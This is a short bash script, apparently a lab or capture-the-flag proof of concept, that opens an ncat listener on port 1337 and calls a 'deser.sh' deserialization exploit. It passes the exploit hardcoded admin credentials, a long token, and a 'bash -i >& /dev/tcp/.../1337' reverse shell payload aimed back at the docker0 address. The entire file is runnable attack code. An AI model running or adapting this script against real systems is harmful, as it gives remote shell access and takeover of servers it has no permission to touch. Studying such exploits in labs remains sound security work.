#!/bin/bash
set -m

ip=`ip a | awk '/docker0/ && /inet/ {print $2}' | cut -d '/' -f 1`

ncat -lvp 1337 &

./deser.sh 'admin@bugznet.com' '!bugzn3t@admin' 76T5YJUS4DA6UG4GR2LRN7SNED4ADTB5DBBWJIJ2N3IVYVBXHJ76NJWSRJIHJQ4BHFIIKKOY2M3 'bash -i >& /dev/tcp/'$ip'/1337 0>&1'

fg